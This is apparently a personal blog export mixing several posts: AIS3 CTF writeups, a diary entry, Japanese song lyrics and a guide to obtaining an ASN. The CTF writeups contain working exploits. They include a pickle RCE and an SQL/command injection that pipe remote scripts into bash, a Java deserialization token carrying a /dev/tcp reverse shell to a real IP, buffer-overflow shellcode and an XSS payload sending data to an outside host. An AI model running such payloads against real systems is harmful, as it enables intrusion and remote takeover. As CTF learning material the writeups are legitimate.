import pickle, base64rce = &quot;&quot;&quot;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[81].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;curl chesskuo.tw/revsh.php|bash&#x27;)&quot;)&quot;&quot;&quot;class A(object):	def __reduce__(self):		return (eval, (rce,))o = A()print(base64.b64encode(pickle.dumps(o)))


AIS3&#123;7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.&#125;

🦉Owl直接猜帳號密碼 有很多組你拿字典撞應該一堆我直接猜 user:password got it~
讀一下 source發現洞洞是蠻基本的 WAF 繞過

可以看到有兩次 str_ireplace()那就把字重複幾遍讓他被過濾後又變成一個字ex : UNION -&gt; UNIUNIONON
接著就是基本的猜 union cols發現為 3
接著枚舉 table schemacheat sheets
payload : &#39;///******///UNIUNIUNIONONON///******///SELSELSELECTECTECT///******///1,group_concat(name||&#39;:&#39;||value),3///******///FRFRFROMOMOM///******///garbage;///***

AIS3&#123;4_ch1ld_15_4_curly_d1mpl3d_lun471c&#125;


Pwn👻 BOF去年的 bof
from pwn import *host = &#x27;60.250.197.227&#x27;port = 10000r = remote(host, port)sh = 0x00400687payload = &#x27;a&#x27; * 0x30 + p64(sh)r.recvuntil(&#x27;ubuntu 18.04.&#x27;)r.sendline(payload)r.interactive()


AIS3&#123;OLd_5ChOOl_tr1ck_T0_m4Ke_s7aCk_A116nmeNt&#125;

📃 Nonsense反組譯後得到的 main

#15 我們知道他會去檢查一個東西通過後會將儲存第二個輸入的變數拿去執行

那個 func 其實只是在檢查你的輸入中是否存在一段 wubbalubbadubdub 這個字串而且在檢查期間不能有 ascii &lt; &#39; &#39; 的 byte 出現
那就在檢查字串前塞些 alphanumeric shellcode再 jmp 到 wubba 後面的任意 shellcode 即可注意 jump 的 byte 也是不能是小於空白 ascii 的稍微填充一下應該不難
from pwn import *host = &#x27;60.250.197.227&#x27;port = 10001r = remote(host, port)s = b&#x27;wubbalubbadubdub&#x27;sc = b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;payload = b&#x27;TX4HPZTAZAYVH92&#x27;payload += b&#x27;u&#x27; + b&#x27;\x20&#x27;payload += s + s + scr.recvuntil(b&#x27;name?&#x27;)r.sendline(b&#x27;a&#x27;)r.recvuntil(b&#x27;yours?&#x27;)r.sendline(payload)r.interactive()


AIS3&#123;Y0U_5peAk_$helL_codE_7hat_iS_CARzy!!!&#125;

]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>備份的重要性QQ</title>
    <url>/posts/2021-07-30-%E5%82%99%E4%BB%BD%E7%9A%84%E9%87%8D%E8%A6%81%E6%80%A7QQ/</url>
    <content><![CDATA[QQ自上次更新已經過了許久再看看這個標題恩 我的 blog source 消失了…


然後前陣子也蠻忙的先是四上的畢業專題接著是四下為了畢業的兩個英文課 (因為我大二把英文退掉去選日文，我以為我多益可以過然後去抵免QQ於是就把這個 blog 給放置了
剛好最近有空就來復原一下花了一整天把之前的文章從 html 還原成 markdown 弄到快吐血還有重新把 blog 的設定給調整好還有整理 github 上 blog repo 的 branch好在以前有深入玩過 hexo 的設定所以除了文章弄非常久以外 config 倒是一下就還原ㄌ
所以你如果去我的 github repo 看的話應該會發現上面有個 gh-pages-archived 的樹枝那個就是上古時代的遺骸 (化石啦你敢嘴zzz 嗚嗚嗚
tail總之東西應該是完美還原ㄌ而最近也比較有空應該會開始龜速更新一些有趣的東西上來 不論是 ctf writeup 或是一些有趣的技術這段時間還玩了不少東西 k8s, traefik, truenas … 之類的
其中我還蠻喜歡 traefik 的因為我自己有在管不少的 server，比如我們學校的社團 NISRA 或是 CPC 都會有需要架一些網站然後包含一堆其他的 micro service這時候 traefik 的強大就非常的符合我們這邊的需求
總之敬請期待啦~
]]></content>
      <tags>
        <tag>diary</tag>
      </tags>
  </entry>
  <entry>
    <title>好歌推薦 - ヒロイン／back number</title>
    <url>/posts/2019-08-04-%E5%A5%BD%E6%AD%8C%E6%8E%A8%E8%96%A6-%E3%83%92%E3%83%AD%E3%82%A4%E3%83%B3%EF%BC%8Fback-number/</url>
    <content><![CDATA[介紹最近發現很好聽的歌ˊ_&gt;ˋ


back number有好幾首歌都不錯聽!!!!都是一些挺悲傷的歌 嘛 但團名本來就是差不多的意思XD
高嶺の花子さん クリスマスソング 這兩首也很棒等我慢慢聽寫歌詞QQ
雖然說是拿來當練日文用啦… 但真的有點累zz
然後呢 之後應該會順便附上中文了有些歌用中文看也是很不錯
歌詞君の毎日まいにちに  僕は似合わないかなkimi no mainichini boku wa niawanaikana我是否不適合出現在你的每一個日子裡白い空から  雪が落ちたshiroi sora kara yuki ga ochita雪從白色的天空落下別にいいさと 吐き出したため息がbetsuni iisato hakidashita tame iki ga心裡想著沒關係 嘆出的一口氣少し残って  寂しそうに消えたsukoshi nokotte sabishi souni kieta還存留著 然後又寂寞地消失了君の街にも  降っているかなkimi no machinimo futteiru kana你那邊 是否也在下雪呢ああ 今いま隣でa ima tonari de啊 此刻就在身邊雪が綺麗と笑うのは君がいいyukigakirei to warauno wa kimigaii喜歡你笑著說雪花好漂亮的樣子でも寒いねって嬉しそうなのもdemo samui ne tte ureshi sou nanomo也喜歡你很開心地說但是好冷喔転びそうになって掴んだ手のその先でkorobisounina tte tsukandete no sonosakide當你差點跌倒時握住了你的手ありがとうって楽しそうなのもarigatou tte tanoshi sounanomo你高興地說謝謝それも君がいいsoremo kimigaii這樣的你我也喜歡気付けば辺りは ほとんどが白く染まってkizu keba atariwa hotondoga shirokusomatte突然察覺到周邊 都被白雪所覆蓋散らかってた事  忘れてしまいそうchirakatte takoto wasureteshi maisou那些零碎的事情 好像都忘記了般意外と積もったねと  メールを送ろうとしてigai totsumo ttaneto meru o oku routoshite當我想要發短信說 沒想到積了這麼多的雪打ちかけのまま  ポケットに入れたuchikakenomama poketto ni ireta只是打了並沒有發送 又放進口袋裏了好まれるような  強つよ く 優やさ しい 僕ぼく にkonomare ruyouna tsuyoku yasashii bokuni你所喜歡的 理想中堅強又溫柔的我変われないかなkawarenaikana是否有一天能變成那樣呢雪が綺麗と笑うのは君がいいyukigakirei to warau no wa kimigaii喜歡你笑著說雪花好漂亮的樣子出しかけた答え胸が痛くてdashikaketa kotae munega itakute帶著答案的胸口 非常痛渡し方もどこに捨てればいいかも分からずにwatashi katamo dokoni sutere baiikamo wakarazuni不知道要將這份心意往哪丟棄才好君から見えてる景色にkimikara mieteru keshikini從你眼前所看到的景色ただ 怯えているんだtada obietei runda我只是害怕著思えばどんな映画を観たってomoe badon na eiga o mi tatte想想不管是看哪部電影どんな小説や音楽だってdonna shousetsu ya ongaku tatte讀哪些小說聽哪些音樂そのヒロインに重ねてしまうのは君だよsono hiroin ni kasanete shimau nowa kimitayo那些女主角通通都是你行ってみたい遠い場所で見たい夜空もitte mitai tooi bashode mitai yozora mo那想去的遠方 想看的星空隣に描くのはいつでもtonari ni egakunowa itsu demo在旁邊所描繪出來的一直都是見慣れたはずの  街がこんなにもminareta hazuno machiga konnanimo明明是應該看習慣了的 街道卻是如此馬鹿だなぁ僕はbakadanaa bokuwa真是個笨蛋啊我君の街に白い雪が降った時kimino machini ni shiroi yukiga fu ttatoki你那邊的街道飄起白色的雪花時君は誰に会いたくなるんだろうkimi wa dareni aitakuna rundarou你會想見誰呢?雪が綺麗だねって誰に言いたくなるんだろうyukigakireidane ttedareni iitakuna rundarou你會想對誰說「雪花好漂亮哦」?僕はやっぱり僕はbokuwa yappari bokuwa我 果然我還是雪が綺麗と笑うのは君がいいyukigakirei towarau nowa kimigaii喜歡你笑著說雪花好漂亮的樣子でも寒いねって嬉しそうなのもdemo samuine tte ureshisou nanomo也喜歡你很開心地說但是好冷喔転びそうになって掴んだ手のその先でkorobi sounina tte tsukanda teno sono sakide當你差點跌倒時握住了你的手ありがとうって楽しそうなのもarigatou tte tanoshisou nanomo你高興地說謝謝全部君がいいzenbu kimigaii這樣的你我也喜歡
]]></content>
      <tags>
        <tag>song</tag>
      </tags>
  </entry>
  <entry>
    <title>ASN 初體驗 Part 1</title>
    <url>/posts/2021-08-08-ASN-%E5%88%9D%E9%AB%94%E9%A9%97-Part-1/</url>
    <content><![CDATA[前言由於看到今年海狗大大在 COSCUP 上的一篇議程 aka 老鼠會抓下線文宣 (x又再次看到了 ASN 這個名詞於是決定去研究看看這是什麼東西


第一次是在兩年前某位朋友的自介中看到這個名詞去 google 了一陣子後發現好像是網路架構中很 Infra 的部分查了一堆相關知識 但實在太抽象了 很難想像究竟是一個什麼樣的概念那些內容對於當時的我很難去實作一個練習也就姑且放置了
如今又偶然間看到這篇議程我想應該是在提醒我 是時候去弄清楚了XD
接下來文章中會記錄一些我剛學到的概念、設定流程當然都非常的基礎甚至可以說是沒有任何進階的保護 (因為我還沒理解到那麼多…所以請大老拍小力一點 會痛 QQ
取得 ASN這個應該是我認為最麻煩的部分但首先我們必須先知道 ASN (Autonomous System Number) 是什麼東西
What is ASN?AS 是 “網際網路” 中溝通的最小單位而 ASN 則是表示該 AS 的唯一 ID這句話可能很詭異 網路中最小單位不是應該是電腦 (IP) 才對嗎?其實這可以透過一般家中的路由器來理解
你家中的 IP 該如何走只要到你的 Gateway 自然就知道要出去還是內網這是非常好理解的二選一
但兩台路由器的情形呢你必須告訴第一台路由器哪些 IP 要送往 第二台同理第二台也是要設定哪些 IP 該送去第一台這就是所謂的 Route Table
由此可見當你越多段 IP 就需要越多路由表去紀錄這些事情上面說的情形還只限於非常少數的路由器之間還可以手動去設定靜態路由我們繼續將範圍放大到全世界 有屬不清的路由器
那 AS 就是管理著多段 IP 該如何送其中可能包含多個路由器的一個群集並且同時往上發布給更上位的路由器說哪些該送到自己這亦或是取得其他路由器發給你的路由表記起來這種互相交換路由表的行為會透過 BGP (Border Gateway Protocol) 來溝通
所以說真正在世界網路上互相溝通的單位是 AS他們彼此交換路由表才能讓世界中任何一個 IP 知道該往哪送
申請 ASN現在世界上管理網路的單位是一個樹狀結構
我們借用一下 APNIC 的圖

簡單的由上往下區分一下級別

世界總管 (灰)
IANA


五大洲級 (橘)
AfriNIC
ARIN
APNIC
LACNIC
RIPE NCC


國家級 (綠)
ex. TWNIC


地區級 (水藍)
業者 (紫)
個人 (深藍)

看完了分級後我們這次申請主要以 RIPE NCC 為主因為他有對 LIR 贊助機制使一般人可以用比較負荷的了的情況取得 ASN不然爆幹貴 文件還很難被審過 QQ
Google 一下應該就會找到一堆 RIPE LIR 有提供代辦服務或是可以來這個網站看人家整理好的表 http://bgp.services/
找好 LIR 後我們需要先了解申請的幾個大步驟這些資料都是即將提交給 LIR 的

去 RIPE NCC 建立幾個關於自己資訊的 Object (maintainer, role, organization)
兩個可以與你對接的 ASN and 對方的 email
於歐洲的設備證明 (ex. 發票)
申請 ASN 的目的
給 LIR 贊助費
與 LIR 的合約 (這個通常在你將資料提交給 LIR 並確認無誤後，對方會簽好給你簽，然後寄回去)

首先我們就先去建立屬於自己的 Object 吧這些資料也就是當我們在 whois 時所噴給你那些資訊
註冊好 RIPE 的帳號後第一步就先到 Create an Object 建立 role and maintainer pair


mntner  這欄位非常重要 是這個 Object 的唯一 ID  之後所建立的其他 Object 都必須關連到這個 ID 你才有權限更動
role  填你自己的名字就好
address  地址 不多說
email  屬於該 role 的 email  請填一定能收到信的信箱 未來所有驗證相關都會用到

新增完成後你就會看到 mntner 的 ID 以及 role 的 ID這些資訊日後都可以更改所以填歪填錯也不用怕
接著我們用剛剛得到的 ID 先去看一下 role 選擇 Update然後在 email 旁邊的 + 按下去 新增一個 abuse-mailbox

填寫好之候就可以儲存
接著我們要新增一個 organization 的物件

這邊要注意

abuse-c  這個就填剛剛 role 的 ID

mnt-ref  這個通常會填寫 LIR 的 mntner ID 以方便追蹤下游  但現在還沒有拿到就先填自己的就好


以上到這裡 RIPE 物件的部分就準備完成了你可以先把資料都丟去給 LIR 確認一遍如果無誤對方就會 (通常) 要你轉一筆註冊費給他然後給你一份同意書簽名寄回接著就是等待 RIPE 把 ASN 分發下來囉
喔對了 通常跟 LIR 申請他都會發一段 IPv6 的給你
下一篇 Part 2 會告訴各位如何將自己申請到的 IP 以及 ASN 廣播到全世界不過先讓我喘一下 腦袋要燒了 (x
]]></content>
      <tags>
        <tag>network</tag>
        <tag>ASN</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3-2021 Pre-exam Writeups</title>
    <url>/posts/2021-07-31-AIS3-2021-Pre-exam-Writeups/</url>
    <content><![CDATA[前測終於衝上 1 開頭了
還三生有幸拿到首殺
學了那麼久感覺自己終於有點進步 (?


另外pre-exam 怎麼突然變難ㄌ 嗚嗚嗚而且一次難太多了ㄅXD還有第一名的35P也太強ㄅ 分數有夠電ㄟ

WelcomeCat Slayer ᶠᵃᵏᵉ | Nekogoroshi說來慚愧我手爆wwwwwwww因為那時候剛首殺完一題 web於是就跑來放鬆心情了 (x

password : 2025830455298

flag : AIS3&#123;H1n4m1z4w4_Sh0k0gun&#125;



Webⲩⲉⲧ ⲁⲛⲟⲧⲏⲉꞅ 𝓵ⲟ𝓰ⲓⲛ ⲣⲁ𝓰ⲉ開局送 source我們取關鍵的部分來看
FLAG = os.environ.get(&#x27;FLAG&#x27;, &#x27;AIS3&#123;TEST_FLAG&#125;&#x27;)users_db = &#123;    &#x27;guest&#x27;: &#x27;guest&#x27;,    &#x27;admin&#x27;: os.environ.get(&#x27;PASSWORD&#x27;, &#x27;S3CR3T_P455W0RD&#x27;)&#125;@app.route(&quot;/&quot;)def index():    def valid_user(user):        return users_db.get(user[&#x27;username&#x27;]) == user[&#x27;password&#x27;]    if &#x27;user_data&#x27; not in session:        return render_template(&quot;login.html&quot;, message=&quot;Login Please :D&quot;)    user = json.loads(session[&#x27;user_data&#x27;])    if valid_user(user):        if user[&#x27;showflag&#x27;] == True and user[&#x27;username&#x27;] != &#x27;guest&#x27;:            return FLAG        else:            return render_template(&quot;welcome.html&quot;, username=user[&#x27;username&#x27;])    return render_template(&quot;login.html&quot;, message=&quot;Verify Failed :(&quot;)@app.route(&quot;/login&quot;, methods=[&#x27;POST&#x27;])def login():    data = &#x27;&#123;&quot;showflag&quot;: false, &quot;username&quot;: &quot;%s&quot;, &quot;password&quot;: &quot;%s&quot;&#125;&#x27; % (        request.form[&quot;username&quot;], request.form[&#x27;password&#x27;]    )    session[&#x27;user_data&#x27;] = data    return redirect(&quot;/&quot;)


從上面可以發現我們輸入的帳號密碼被放進 json 裡面轉成 dict 然後被送去跟一個寫死的 user_db 驗證帳號密碼 也因為不存在 leak admin 密碼的方法 所以要偽造 admin 登入是不可能的 而且看到 #18 要我們讓 showflag 等於 true 這時候第一個出現的想法就是 json 覆蓋
在有了上面的條件後 接著需要讓登入的使用者不為 guest 卻又要過 #11 的等式 可是又弄不到 admin 的密碼阿 所以轉念一想如果是一個不存在 user_db 中的使用者登入呢? 結果還真被我矇到 dict.get() 在查詢不到鍵值時會回傳 None 再來就好辦了 因為 json 構造 null 轉成 python 的型態就會變成 None
最終就構造出 payload 送上去
username&#x3D; 
password&#x3D;&quot;,&quot;showflag&quot;:true,&quot;password&quot;:null,&quot;username&quot;:&quot;chess




flag : AIS3&#123;/r/badUIbattles?!?!&#125;

HaaS這題的考點我有點不是很清楚所以我覺得解法有點通靈XD
總之網站功能是要你輸入一個網址然去會去幫你檢查該網址服務是否活著一看就是 SSRF 的樣子所以就丟了個 127.0.0.1 果真被 ban於是就繞過它
繞完後發現它只告訴你活著 就這樣 沒然後了這時候就很問號於是到處看看發現 input 其實還有一個隱藏欄位 status看那個樣子是 http return code剛好它的 response 中也還有另一個 return code於是猜是不是要兩個不同果真一改就噴出 flag 了

payload : 
  curl -X POST -d &quot;url=http://127.0.1.1&amp;status=666&quot; &quot;http://quiz.ais3.org:7122/haas&quot;

flag : AIS3&#123;V3rY_v3rY_V3ry_345Y_55rF&#125;


【5&#x2F;22 重要公告】首殺題，整個心情愉悅這題的流程
從網址的長相可以發現可能存在 LFIhttp://quiz.ais3.org:8001/?module=modules/home然後尾巴應該是 .php 本身就寫死在 code 裡面了所以就把已知的東西撈出來看一看http://quiz.ais3.org:8001/?module=php://filter/read=covert.base64-encode/resource=index
index.php 沒什麼東西只知道 GET[&#39;modules&#39;] 沒東西的話預設會去 include modules/home.php但 home.php 沒什麼值得看的 都是 html 而已只知道它會去 fetch modules/api.php

module&#x2F;api.php&lt;?phpheader(&#x27;Content-Type: application/json&#x27;);include &quot;config.php&quot;;$db = new SQLite3(SQLITE_DB_PATH);if (isset($_GET[&#x27;id&#x27;])) &#123;    $data = $db-&gt;querySingle(&quot;SELECT name, host, port FROM challenges WHERE id=$&#123;_GET[&#x27;id&#x27;]&#125;&quot;, true);    $host = str_replace(&#x27; &#x27;, &#x27;&#x27;, $data[&#x27;host&#x27;]);    $port = (int) $data[&#x27;port&#x27;];    $data[&#x27;alive&#x27;] = strstr(shell_exec(&quot;timeout 1 nc -vz &#x27;$host&#x27; $port 2&gt;&amp;1&quot;), &quot;succeeded&quot;) !== FALSE;    echo json_encode($data);&#125; else &#123;    $json_resp = [];    $query_res = $db-&gt;query(&quot;SELECT * FROM challenges&quot;);    while ($row = $query_res-&gt;fetchArray(SQLITE3_ASSOC)) $json_resp[] = $row;    echo json_encode($json_resp);&#125;

看到這份檔案就是關鍵了從 code 可以知道 sql query 出來的 host 欄位會被放進 shell_exec 去當作參數執行因此最直觀就是 sqlite injection + command injection

payload :  http://quiz.ais3.org:8001/?module=modules/api&amp;id=0 union select 1,&quot;chesskuo.tw&#x27;$(curl$&#123;IFS&#125;sh.chesskuo.tw|bash)&#x27;&quot;,80

直接上 payload一個關鍵點空白會被取代掉 因此需要用 $&#123;IFS&#125; 繞一下然後我的作法是打一個 reverse shell 到我的 server 上

flag : AIS3&#123;o1d_skew1_w3b_tr1cks_co11ect10n_:D&#125;

XSS Me這題主要考點就是你知不知道 網址的 # 後面的東西不會被當作網址 or 參數解析還有在網址直接輸入 javascript:alert() 其實也可以直接執行 js綜合以上兩點直接看 payload 應該就懂了

payload :  http://quiz.ais3.org:8003/?type=error&amp;message=&lt;/script&gt;&lt;script&gt;location=location.hash.slice(1)//#javascript:fetch(&#x27;/getflag&#x27;).then(function(r)&#123;return/**/r.text()&#125;).then(function(r)&#123;location=&#x27;//chesskuo.tw/&#x27;+r&#125;)
flag : AIS3&#123;XSS_K!NG&#125;

Cat Slayer ᴵⁿᵛᵉʳˢᵉ首先大家先記得這個網站 記住我太重要了

我因為 getRuntime.exec payload 湊不出來又不知道有工具就被踢到第 12 名我就爛[name&#x3D;chess]

這題 wp 邊打邊流淚真的會哭死臨門一腳
直接說結論 這題是 java deserialization可以參考這篇教學你會發現底下講到的反射型的串接方式在 maou/WEB-INF/classes/com/cat/Maou.class 的 readObject() 中有非常相似的函數存在 (應該說你要的東西都有了照著 code 的結構一步一步串回來就好
這邊附上我修改過的幾個檔案

Maou.java
package com.cat;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.io.Serializable;import java.lang.reflect.Constructor;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.ArrayList;import java.util.Iterator;import java.io.*; public class Maou implements Serializable &#123;    String CAT_NAME_SETTER = &quot;exec&quot;;    String[] DEMON_NAMES = &#123;&quot;bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwOC42MS4xNjMuMTE1LzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; #&quot;&#125;;    ArrayList&lt;Object&gt; cats = new ArrayList&lt;&gt;();    String name = &quot;(unnamed)&quot;;    public Maou(String name2) &#123;        this.name = name2;    &#125;    public void summonCats(int num) throws ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;        String[] catTypes = &#123;&quot;BabyCat&quot;, &quot;NormalCat&quot;, &quot;SuperCat&quot;&#125;;        for (int i = 0; i &lt; num; i++) &#123;            String type = catTypes[(int) (Math.random() * 3.0d)];            this.cats.add(Class.forName(&quot;java.lang.Runtime&quot;));        &#125;    &#125;    public String getName() &#123;        return this.name;    &#125;    public ArrayList&lt;Object&gt; getCats() &#123;        return this.cats;    &#125;    private String genCatName() &#123;        return this.DEMON_NAMES[(int) (Math.random() * ((double) this.DEMON_NAMES.length))];    &#125;    private void writeObject(ObjectOutputStream stream) throws IOException &#123;        stream.writeObject(this.DEMON_NAMES);        stream.writeObject(this.CAT_NAME_SETTER);        stream.writeObject(this.name);        ArrayList&lt;String&gt; catsClass = new ArrayList&lt;&gt;();        Iterator&lt;Object&gt; it = this.cats.iterator();        catsClass.add(&quot;java.lang.Runtime&quot;);        // while (it.hasNext()) &#123;        //     catsClass.add(&quot;java.lang.Runtime&quot;);        // &#125;        stream.writeObject(catsClass);    &#125;    private void readObject(ObjectInputStream stream) throws IOException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;        this.DEMON_NAMES = (String[]) stream.readObject();        this.CAT_NAME_SETTER = (String) stream.readObject();        this.name = (String) stream.readObject();        this.cats = new ArrayList&lt;&gt;();        Iterator&lt;String&gt; it = ((ArrayList) stream.readObject()).iterator();        while (it.hasNext()) &#123;            String catCls = it.next();            String[] parts = catCls.split(&quot;\\.&quot;);            String typeName = parts[parts.length - 1];            Class&lt;?&gt; cls = Class.forName(catCls);            Method method = cls.getMethod(this.CAT_NAME_SETTER, String.class);            Constructor constructor = cls.getDeclaredConstructor(new Class[0]);            constructor.setAccessible(true);            Object cat = constructor.newInstance(new Object[0]);            Process proc = (Process) method.invoke(cat, genCatName() + &quot;-&quot; + typeName);                        BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));            System.out.println(&quot;Here is the standard output of the command:\n&quot;);            String s = null;            while ((s = stdInput.readLine()) != null) &#123; System.out.println(s); &#125;            System.out.println(&quot;Here is the standard error of the command (if any):\n&quot;);            while ((s = stdError.readLine()) != null) &#123; System.out.println(s); &#125;            this.cats.add((Object) cat);        &#125;    &#125;&#125;

用來產生 token 的 main function
import com.cat.Maou;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.util.Base64;public class Test &#123;	public static void main(String[] args) throws Exception &#123;		String username = &quot;chess&quot;;		Maou player = new Maou(username);		player.summonCats(1);		ByteArrayOutputStream bos = new ByteArrayOutputStream();		new ObjectOutputStream(bos).writeObject(player);		String token = Base64.getEncoder().encodeToString(bos.toByteArray());		System.out.print(token);		// String token = &quot;rO0ABXNyAAxjb20uY2F0Lk1hb3Uo+LGFecOJ3AMABEwAD0NBVF9OQU1FX1NFVFRFUnQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC0RFTU9OX05BTUVTdAATW0xqYXZhL2xhbmcvU3RyaW5nO0wABGNhdHN0ABVMamF2YS91dGlsL0FycmF5TGlzdDtMAARuYW1lcQB+AAF4cHVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABFjYWxjLmV4ZSAmJiBlY2hvIHQABGV4ZWN0AAVjaGVzc3NyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAARamF2YS5sYW5nLlJ1bnRpbWV4eA==&quot;;		// new ObjectInputStream(new ByteArrayInputStream(Base64.getDecoder().decode(token))).readObject();	&#125;&#125;

最後的 payload 可以參考以下我一樣是打一個 reverse shell 到我的 server 上最後的重點其實就在如何構造出一個 java.lang.Runtime.exec() 可以吃的 command還有不要忘記 Maou.java#72 那邊command 最後會串接一段垃圾在後面 要繞過

payload : 

command : /bin/bash -i &gt;&amp; /dev/tcp/108.61.163.115/6666 0&gt;&amp;1
token : rO0ABXNyAAxjb20uY2F0Lk1hb3Uo+LGFecOJ3AMABEwAD0NBVF9OQU1FX1NFVFRFUnQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC0RFTU9OX05BTUVTdAATW0xqYXZhL2xhbmcvU3RyaW5nO0wABGNhdHN0ABVMamF2YS91dGlsL0FycmF5TGlzdDtMAARuYW1lcQB+AAF4cHVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AGtiYXNoIC1jIHtlY2hvLEwySnBiaTlpWVhOb0lDMXBJRDRtSUM5a1pYWXZkR053THpFd09DNDJNUzR4TmpNdU1URTFMelkyTmpZZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0gI3QABGV4ZWN0AAVjaGVzc3NyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAABdwQAAAABdAARamF2YS5sYW5nLlJ1bnRpbWV4eA==


flag : AIS3&#123;maou_lucifer_meowmeow&#125;



MiscMicrocheese題目是 crypto 那題的簡單版但完全沒用到 crpyto XD

server.pydef play(game: Game):    ai_player = AIPlayer()    win = False    while not game.ended():        game.show()        print_game_menu()        choice = input(&#x27;it\&#x27;s your turn to move! what do you choose? &#x27;).strip()        if choice == &#x27;0&#x27;:            pile = int(input(&#x27;which pile do you choose? &#x27;))            count = int(input(&#x27;how many stones do you remove? &#x27;))            if not game.make_move(pile, count):                print_error(&#x27;that is not a valid move!&#x27;)                continue        elif choice == &#x27;1&#x27;:            game_str = game.save()            digest = hash.hexdigest(game_str.encode())            print(&#x27;you game has been saved! here is your saved game:&#x27;)            print(game_str + &#x27;:&#x27; + digest)            return        elif choice == &#x27;2&#x27;:            break        # no move -&gt; player wins!        if game.ended():            win = True            break        else:            print_move(&#x27;you&#x27;, count, pile)            game.show()        # the AI plays a move        pile, count = ai_player.get_move(game)        assert game.make_move(pile, count)        print_move(&#x27;i&#x27;, count, pile)    if win:        print_flag(flag)        exit(0)    else:        print_lose()

在這段中並沒有針對 choice 超過 2 的行為去做限制因此造成只有 bot 自己在下棋的情況 而我們自己卻不用動就這樣一直重複到我們走下一步穩贏再動作即可
這邊要注意的是不能第一次就輸入超過 2 的選項 會噴錯因為 #36 的地方 pile 跟 count 並未被宣告需要先透過選項 0 生成後 才能開始使用 bug

flag : AIS3&#123;5._e3_b5_6._a4_Bb4_7._Bd2_a5_8._axb5_Bxc3&#125; 

Blind題目的邏輯是先把 stdout 給關閉然後給你一個執行 syscall 的機會之後才輸出 flag因此照正常走我們是看不到 flag 被輸出的
這題去翻一遍 syscall docs 就可以知道什麼能用了XD我們的目的就是重新開啟 stdout

dup2(0, 1)
flag : AIS3&#123;dupppppqqqqqub&#125;

[震撼彈] AIS3 官網疑遭駭！我很喜歡這題挺有趣的也非常重要的想法

偽造 DNS record

首先我的習慣是先去看看 export object 裡面有沒有什麼好康從成堆的紀錄裡會發現有一堆去請求 magic.ais3.org但是其中一個卻是 magic.ais3.org:8100

接著我們可以得知 magic.ais3.org 是指向 ip 10.153.11.126因此直接去網站上看看80 port 沒反應但 8100 卻給了個 nginx 的預設頁面
看到這邊第一個想法就是該不會認 domain route 頁面ㄅ於是輸入 magic.ais3.org:8100 在網址上卻得到回應 domain 不存在
事情好啦 我們又沒有 ais3.org 的管理權限那要怎麼辦呢
這時候就要善用每一台電腦自己本身的 DNS 解析針對 OS 不同 個別存在一份檔案來管理本機解析 DNS

windows : C:\Windows\System32\drivers\etc\hosts
linux : /etc/hosts

在檔案裡面自己指定一下
10.153.11.126 magic.ais3.org

接著你就拿到一個 web shell 了後面跟著的參數是 base64 後 reverse 的字串


flag : AIS3&#123;0h!Why_do_U_kn0w_this_sh3ll1!1l!&#125;


CryptoMicrochip邏輯逆推寫code爆破

exp.py
flag = &#x27;AIS3&#x27;with open(&#x27;output.txt&#x27;, &#x27;r&#x27;) as f:	result = f.read().split(&#x27;: &#x27;)[1].strip()keys = list()for i in range(0, 4):	num = ord(flag[i]) - 32	num2 = ord(result[3 - i]) - 32	keys.append(num2 + 96 - num)flag = &#x27;&#x27;for i in range(0, len(result), 4):	for j in range(4):		num = ord(result[i + 3 - j]) - 32		num = num + 96 - keys[j]		if num &lt; 0:			num %= 96		num = num + 32		if num &gt; 128:			num %= 96		flag += chr(num)print(flag)

flag : AIS3&#123;w31c0me_t0_AIS3_cryptoO0O0o0Ooo0&#125;


ReSident evil villAge給 server 一個字串會用 d 去加密給你也可以丟加密的字串過去解密出原始字串
要拿到 flag 需解密出 Ethan Winters但又不能拿 Ethan Winters 去加密
這時候就要利用到 RSA 的數學推導
假設 $x$ 為我們需要的字串 (也就是 Ethan Winters)因此我們想要得到 $x$ 加密後的結果 就是 $x^d$
送 2x 過去加密會得到 $f_1 &#x3D; (2x)^d mod N$送 4x 過去加密會得到 $f_2 &#x3D; (4x)^d mod N$這邊假設 N 超大 所以以下都忽略 %N
$\frac{f_2}{f_1} &#x3D; \frac{4^d * x^d}{2^d * x^d} &#x3D; 2^d$
$\frac{f_1}{2^d} &#x3D; x^d$
接著得到的 $2^d$ 就丟給 server 去解密就可拿到 flag 了以下是我的腳本 可能有點醜XD

exp.py
